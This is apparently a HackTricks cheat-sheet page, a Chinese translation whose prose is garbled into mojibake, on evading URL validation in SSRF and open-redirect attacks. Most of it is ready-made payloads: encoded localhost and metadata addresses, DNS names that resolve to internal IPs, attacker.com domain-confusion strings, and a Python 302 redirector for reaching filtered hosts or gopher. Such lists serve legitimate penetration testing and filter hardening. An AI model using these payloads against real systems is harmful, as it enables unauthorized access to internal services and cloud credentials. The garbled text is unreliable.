# URLæ ¼å¼ç»•è¿‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°å¯¹æ‚¨æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«ä¿®å¤å®ƒä»¬ã€‚Intruderè¿½è¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿›è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œåœ¨æ‚¨çš„æ•´ä¸ªæŠ€æœ¯æ ˆä¸­æ‰¾åˆ°é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ä»Šå¤©å°±å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

### æœ¬åœ°ä¸»æœº
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://â‘ â‘¡â‘¦.â“ª.â“ª.â“ª

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127ã€‚0ã€‚0ã€‚1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
![](<../../.gitbook/assets/image (649) (1) (1).png>)

**Burp æ‰©å±•** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) å®ç°äº† IP æ ¼å¼ç»•è¿‡ã€‚

### åŸŸåè§£æå™¨
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attackerã€‚com
â’¶â“‰â“‰â’¶â’¸â“€â’ºâ“¡.â’¸â“â“œ
```

```
â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾
â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’—
â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’°
â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰
â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢
â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿
```
### åŸŸåæ··æ·†
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### è·¯å¾„å’Œæ‰©å±•åç»•è¿‡

å¦‚æœè¦æ±‚ URL å¿…é¡»ä»¥è·¯å¾„æˆ–æ‰©å±•åç»“å°¾ï¼Œæˆ–è€…å¿…é¡»åŒ…å«è·¯å¾„ï¼Œä½ å¯ä»¥å°è¯•ä»¥ä¸‹ç»•è¿‡æ–¹æ³•ï¼š
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### Fuzzing

å·¥å…· [**recollapse**](https://github.com/0xacb/recollapse) å¯ä»¥ä»ç»™å®šè¾“å…¥ç”Ÿæˆå˜ä½“ï¼Œå°è¯•ç»•è¿‡ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ä¹Ÿå¯ä»¥æŸ¥çœ‹ [**è¿™ç¯‡æ–‡ç« **](https://0xacb.com/2022/11/21/recollapse/) è·å–æ›´å¤šä¿¡æ¯ã€‚

### é€šè¿‡é‡å®šå‘ç»•è¿‡

æœåŠ¡å™¨å¯èƒ½ä¼š**è¿‡æ»¤åŸå§‹è¯·æ±‚**ä¸­çš„ SSRFï¼Œ**ä½†ä¸ä¼š**è¿‡æ»¤å¯¹è¯¥è¯·æ±‚çš„å¯èƒ½çš„**é‡å®šå‘**å“åº”ã€‚\
ä¾‹å¦‚ï¼Œä¸€ä¸ªå¯¹ SSRF æ•æ„Ÿçš„æœåŠ¡å™¨å¯èƒ½é€šè¿‡ï¼š`url=https://www.google.com/` è¿›è¡Œè¿‡æ»¤**url å‚æ•°**ã€‚ä½†å¦‚æœä½ ä½¿ç”¨ [python æœåŠ¡å™¨å“åº” 302](https://pastebin.com/raw/ywAUhFrv) åˆ°ä½ æƒ³è¦é‡å®šå‘çš„åœ°æ–¹ï¼Œä½ å¯èƒ½èƒ½å¤Ÿ**è®¿é—®è¢«è¿‡æ»¤çš„ IP åœ°å€**ï¼Œå¦‚ 127.0.0.1ï¼Œç”šè‡³è¢«è¿‡æ»¤çš„**åè®®**ï¼Œå¦‚ gopherã€‚\
[æŸ¥çœ‹è¿™ä»½æŠ¥å‘Šã€‚](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## è§£é‡ŠæŠ€å·§

### åæ–œæ æŠ€å·§

ç®€è€Œè¨€ä¹‹ï¼Œ_åæ–œæ æŠ€å·§_ ä¾èµ–äºåˆ©ç”¨ä¸¤ä¸ªâ€œURLâ€è§„èŒƒä¹‹é—´çš„å¾®å°å·®å¼‚ï¼š[WHATWG URL æ ‡å‡†](https://url.spec.whatwg.org/#url-parsing)å’Œ[RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B)ã€‚RFC3986 æ˜¯ä¸€ä¸ªé€šç”¨çš„ã€å¤šç”¨é€”çš„ _ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦_ è¯­æ³•è§„èŒƒï¼Œè€Œ WHATWG URL æ ‡å‡†ä¸“é—¨é’ˆå¯¹ Web å’Œ URLï¼ˆå®ƒä»¬æ˜¯ URI çš„å­é›†ï¼‰ã€‚ç°ä»£æµè§ˆå™¨å®ç°äº† WHATWG URL æ ‡å‡†ã€‚

å®ƒä»¬éƒ½æè¿°äº†è§£æ URI/URL çš„æ–¹æ³•ï¼Œä½†æœ‰ä¸€ä¸ªç»†å¾®çš„å·®åˆ«ã€‚WHATWG è§„èŒƒæè¿°äº†[ä¸€ä¸ªé¢å¤–çš„å­—ç¬¦](https://url.spec.whatwg.org/#authority-state)ï¼Œå³ `\`ï¼Œå®ƒçš„è¡Œä¸ºå°±åƒ `/`ï¼šç»“æŸä¸»æœºåå’Œæƒé™æ ‡è¯†ï¼Œå¹¶å¼€å§‹ URL çš„è·¯å¾„ã€‚

![ä¸¤ä¸ªè§„èŒƒè§£æåŒä¸€ä¸ª URL çš„æ–¹å¼ä¸åŒ](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### å…¶ä»–æ··æ·†

![](<../../.gitbook/assets/image (629).png>)

å›¾ç‰‡æ¥æº [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«ä¿®å¤ã€‚Intruder è·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œåœ¨æ‚¨çš„æ•´ä¸ªæŠ€æœ¯æ ˆä¸­æ‰¾åˆ°é—®é¢˜ï¼Œä» API åˆ° Web åº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) ä»Šå¤©ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF** ç‰ˆæœ¬ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
